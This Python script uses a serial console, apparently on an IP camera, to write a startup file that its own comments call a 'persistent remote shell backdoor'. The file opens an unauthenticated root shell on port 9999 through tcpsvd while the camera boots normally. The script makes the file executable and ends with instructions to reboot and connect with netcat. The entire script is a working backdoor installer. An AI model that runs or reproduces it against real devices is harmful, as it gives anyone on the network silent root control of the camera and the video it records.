"""Write debug.sh backdoor using simple echo commands (no heredoc)."""
import serial
import time
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

s = serial.Serial('COM3', 115200, timeout=3)
time.sleep(0.3)
s.read(16384)

def cmd(c, delay=1):
    s.read(16384)
    s.write((c + '\n').encode())
    time.sleep(delay)
    data = s.read(16384)
    return data.decode('latin-1', errors='replace').strip()

# Verify shell
r = cmd('echo TEST123')
if 'TEST123' not in r:
    print('ERROR: no shell')
    s.close()
    sys.exit(1)
print('[OK] Shell alive')

# Write debug.sh line by line using echo with >>
target = '/tmp/configfs/debug.sh'

lines = [
    '#!/bin/sh',
    '# debug.sh - persistent remote shell backdoor',
    '# Remove this file to disable: rm /etc/conf.d/debug.sh',
    '',
    '# Root shell on port 9999 via tcpsvd',
    'tcpsvd 0.0.0.0 9999 /bin/sh -il &',
    '',
    '# Normal camera startup',
    'echo "startup (with shell on :9999)"',
    '/tmp/appfs/progs/bin/superb &',
    'sleep 15',
    'cd /progs/rec/00/PQtool && ./PQTools.sh -c',
]

# First line uses > to create/overwrite, rest use >>
print(f'[..] Writing {target}...')
for i, line in enumerate(lines):
    op = '>' if i == 0 else '>>'
    # Escape any special chars for echo
    escaped = line.replace("'", "'\\''")
    write_cmd = f"echo '{escaped}' {op} {target}"
    r = cmd(write_cmd, 0.3)

print('[OK] File written')

# chmod
r = cmd(f'chmod +x {target}')
print('[OK] Made executable')

# Verify
print()
print('[..] Verifying contents:')
r = cmd(f'cat {target}', 2)
print(r)
print()

r = cmd(f'ls -la {target}')
print('[..] File info:')
print(r)
print()

r = cmd(f'md5sum {target}')
print('[..] MD5:')
print(r)

print()
print('=' * 60)
print('DONE - debug.sh backdoor written to configfs')
print()
print('Next steps:')
print('  1. Reboot camera (power cycle or "reboot" command)')
print('  2. Wait for WiFi to connect (~30s)')
print('  3. Connect: nc 192.168.1.153 9999')
print('=' * 60)

s.close()
